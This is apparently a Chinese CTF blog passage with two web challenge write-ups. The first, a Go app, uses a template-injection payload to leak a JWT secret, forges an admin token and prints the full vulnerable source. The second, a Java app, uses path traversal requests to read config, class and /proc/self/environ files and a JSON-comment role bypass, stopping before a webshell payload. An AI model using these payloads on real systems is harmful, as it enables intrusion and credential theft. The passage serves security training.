<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">flag_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>	
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> is_admin <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>	#从jwt解析出id和is_admin属性
		<span class="token keyword">if</span> is_admin <span class="token operator">==</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>	#判断is_admin属性为<span class="token boolean">true</span>才可以返回flag
			p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"Hi "</span> <span class="token operator">+</span> id <span class="token operator">+</span> <span class="token string">", flag is "</span> <span class="token operator">+</span> flag<span class="token punctuation">}</span>
			res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token punctuation">}</span>
			w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据regist_handler()，我们知道注册账户时，默认给的is_admin属性为false</p>
<p>此处要让flag_handler()返回flag，我们需要通过伪造jwt把is_admin属性修改为true</p>
<p>又由于jwt编码过程中需要用到secret_key作签名密钥，secret_key是环境变量，就需要通过SSTI漏洞把secret_key读出来</p>
<p>secret_key定义：</p>
<pre class="line-numbers language-none"><code class="language-none">var secret_key = os.Getenv("KEY")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>jwt_encode()函数：</p>
<pre class="line-numbers language-none"><code class="language-none">func jwt_encode(id string, is_admin bool) (string, error) {
	claims := AccountClaims{
		id, is_admin, jwt.StandardClaims{},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret_key))
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SSTI注入参考：<a href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p>
<p>常规思路可以注入<code>{{.}}</code>或<code>{{.secret_key}}</code>来读secret_key属性，但此处由于<code>root_handler()</code>函数得到的acc是数组中的地址，也就是get_account函数通过在全局变量acc数组中查找我们的用户，这种情况下直接注入<code>{{.secret_key}}</code>会返回空，所以此处只能用<code>{{.}}</code>来返回全部属性</p>
<p>注册、认证获取jwt的请求和响应如下</p>
<pre class="line-numbers language-none"><code class="language-none">/regist?id={{.}}&amp;pw=password
{"status":true,"msg":""}

/auth?id={{.}}&amp;pw=password
{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在根目录传入X-Token头部，成功读到secret_key</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810145014196.png"></p>
<p>伪造jwt，修改如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810145557780.png"></p>
<p>在/flag传入伪造的jwt，获取flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810145643427.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_46081055/article/details/124201444">https://blog.csdn.net/weixin_46081055/article/details/124201444</a></p>
<p><a href="https://tyskill.github.io/posts/gossti/">https://tyskill.github.io/posts/gossti/</a></p>
<h2 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"encoding/json"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"text/template"</span>

	<span class="token string">"github.com/golang-jwt/jwt"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> Account <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	id         <span class="token builtin">string</span>
	pw         <span class="token builtin">string</span>
	is_admin   <span class="token builtin">bool</span>
	secret_key <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> AccountClaims <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Id       <span class="token builtin">string</span> <span class="token string">`json:"id"`</span>
	Is_admin <span class="token builtin">bool</span>   <span class="token string">`json:"is_admin"`</span>
	jwt<span class="token punctuation">.</span>StandardClaims
<span class="token punctuation">}</span>

<span class="token keyword">type</span> Resp <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Status <span class="token builtin">bool</span>   <span class="token string">`json:"status"`</span>
	Msg    <span class="token builtin">string</span> <span class="token string">`json:"msg"`</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> TokenResp <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Status <span class="token builtin">bool</span>   <span class="token string">`json:"status"`</span>
	Token  <span class="token builtin">string</span> <span class="token string">`json:"token"`</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> acc <span class="token punctuation">[</span><span class="token punctuation">]</span>Account
<span class="token keyword">var</span> secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"KEY"</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> flag <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> admin_id <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"ADMIN_ID"</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> admin_pw <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"ADMIN_PW"</span><span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	acc <span class="token operator">=</span> acc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid <span class="token builtin">string</span><span class="token punctuation">)</span> Account <span class="token punctuation">{</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> acc <span class="token punctuation">{</span>
		<span class="token keyword">if</span> acc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> uid <span class="token punctuation">{</span>
			<span class="token keyword">return</span> acc<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> Account<span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">jwt_encode</span><span class="token punctuation">(</span>id <span class="token builtin">string</span><span class="token punctuation">,</span> is_admin <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	claims <span class="token operator">:=</span> AccountClaims<span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> is_admin<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>StandardClaims<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">}</span>
	token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>
	<span class="token keyword">return</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token<span class="token punctuation">,</span> err <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">ParseWithClaims</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>AccountClaims<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>token <span class="token operator">*</span>jwt<span class="token punctuation">.</span>Token<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">false</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> claims<span class="token punctuation">,</span> ok <span class="token operator">:=</span> token<span class="token punctuation">.</span>Claims<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>AccountClaims<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token operator">&amp;&amp;</span> token<span class="token punctuation">.</span>Valid <span class="token punctuation">{</span>
		<span class="token keyword">return</span> claims<span class="token punctuation">.</span>Id<span class="token punctuation">,</span> claims<span class="token punctuation">.</span>Is_admin
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">false</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">auth_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1024</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	user_acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>
	<span class="token keyword">if</span> user_acc<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> user_acc<span class="token punctuation">.</span>pw <span class="token operator">==</span> upw <span class="token punctuation">{</span>
		token<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">jwt_encode</span><span class="token punctuation">(</span>user_acc<span class="token punctuation">.</span>id<span class="token punctuation">,</span> user_acc<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
		p <span class="token operator">:=</span> TokenResp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> token<span class="token punctuation">}</span>
		res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">regist_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	new_acc <span class="token operator">:=</span> Account<span class="token punctuation">{</span>uid<span class="token punctuation">,</span> upw<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">}</span>
	acc <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span> new_acc<span class="token punctuation">)</span>

	p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">}</span>
	res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">flag_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> is_admin <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
		<span class="token keyword">if</span> is_admin <span class="token operator">==</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>
			p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"Hi "</span> <span class="token operator">+</span> id <span class="token operator">+</span> <span class="token string">", flag is "</span> <span class="token operator">+</span> flag<span class="token punctuation">}</span>
			res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token punctuation">}</span>
			w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">root_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
		acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>
		tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	admin <span class="token operator">:=</span> Account<span class="token punctuation">{</span>admin_id<span class="token punctuation">,</span> admin_pw<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">}</span>
	acc <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span> admin<span class="token punctuation">)</span>

	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> root_handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/auth"</span><span class="token punctuation">,</span> auth_handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> flag_handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/regist"</span><span class="token punctuation">,</span> regist_handler<span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0:11000"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>JWT伪造</tag>
        <tag>go代码审计</tag>
        <tag>SSTI模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2021-babycat-revenge</title>
    <url>/posts/b53475ea.html</url>
    <content><![CDATA[<h1 id="GKCTF2021-babycat-revenge"><a href="#GKCTF2021-babycat-revenge" class="headerlink" title="GKCTF2021-babycat-revenge"></a>GKCTF2021-babycat-revenge</h1><p>知识点概要：目录遍历、java审计、<code>XMLDecoder</code>反序列化</p>
<p>题目hint：1.你知道注释符吗 2.PrintWriter？</p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912142227769.png"></p>
<p>注册页面空白，查看注册页面源码如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143046109.png"></p>
<p>对比登录页面源码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143155216.png"></p>
<p>ajax请求逻辑大同小异</p>
<p>登录账号口令随便输入，Burp捕获登录页面请求包如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143421057.png"></p>
<p>捕获注册页面请求包，修改为post方法，数据部分模仿登录请求传参，如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143625910.png"></p>
<p>注册成功，登录，页面如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143906641.png"></p>
<p>ROLE是guest，说明我们是游客权限。有一个上传功能和一个下载功能，上传功能如下，响应提示只允许admin权限上传</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912144237402.png"></p>
<p>下载功能的链接明显有问题，极有可能存在目录遍历</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912144511295.png"></p>
<p>Java Web项目，根据常规目录结构，读取<code>web.xml</code>找servlet接口类文件路径</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912153319712.png" style="zoom: 67%;">

<pre class="line-numbers language-none"><code class="language-none">../../WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912152841090.png"></p>
<p>都下载下来</p>
<pre class="line-numbers language-none"><code class="language-none">/home/download?file=../classes/com/web/servlet/registerServlet.class
uploadServlet.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>用<code>jadx</code>反编译获得源码，审计<code>uploadServlet.class</code>，用户Role需要是admin才能上传，且文件后缀有白名单，文件内容有黑名单，如下图</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912161318708.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912161340714.png"></p>
<p>那么首要目标是绕过Role需要是admin的验证</p>
<p>在<code>registerServlet.class</code>，会对注册时的post参数，即<code>data={"username":"admin","password":"admin"}</code></p>
<p>做<code>\"role\":\"(.*?)\"</code>正则匹配，匹配到<code>"role":"xxx"</code>就会替换成<code>"role":"guest"</code>，如果没有role，则设置role为guest，所以必须让while循环里的role有值，使得if条件成立</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912162130559.png"></p>
<p>因为 JSON 中的内联注释来不会影响 JSON 数据解析，所以此处payload如下</p>
<pre class="line-numbers language-none"><code class="language-none">data={"username":"admin","password":"admin","role":"test","role"/**/:"admin"}
或
data={"username":"admin","password":"admin","role":"admin"/*,"role":"test"*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第一个payload在while处匹配到<code>"role":"test"</code>，匹配不到<code>"role"/**/:"admin"</code>，进到if条件里，替换的是<code>"role":"test"</code>，json解析时遇到重复的role键时，会使用最后一个role键值对，最终<code>"role":"admin"</code>；</p>
<p>第二个payload在while处匹配到<code>"role":"admin"</code>，但第二次while循环匹配到<code>"role":"test"</code>会覆盖掉第一个<code>"role":"admin"</code>，进到if条件里，替换的是<code>"role":"test"</code>，json解析时，由于<code>"role":"test"</code>被注释，最终<code>"role":"admin"</code>。</p>
<p>注册成功，登录后，ROLE显示为admin，如下图</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193145062.png"></p>
<p>在<code>registerServlet.class</code>和<code>loginServlet.class</code>中，有从dao导入的包，下载下来审计</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193002964.png"></p>
<pre class="line-numbers language-none"><code class="language-none">/home/download?file=../classes/com/web/dao/baseDao.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在<code>com.web.dao.baseDao</code>中，有<code>XMLDecoder()</code>方法，可以尝试将<code>db.xml</code>覆盖为恶意代码后通过登录或注册功能触发<code>XMLDecoder</code>反序列化（追溯调用链，在登录和注册功能代码，都有调用<code>baseDao.getConnection()</code>方法，从而调用<code>getConfig()</code>方法，从而触发<code>XMLDecoder()</code>）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193832564.png"></p>
<p>读取环境变量<code>CATALINA_HOME</code> ，其值为 <code>/usr/local/tomcat</code></p>
<pre class="line-numbers language-none"><code class="language-none">/home/download?file=../../../../../../proc/self/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912185419149.png"></p>
<p>因为上传白名单有xml，题目hint有PrintWriter，所以恶意代码如下。其中<code>CDATA</code>数据块为蚁剑的jsp马</p>
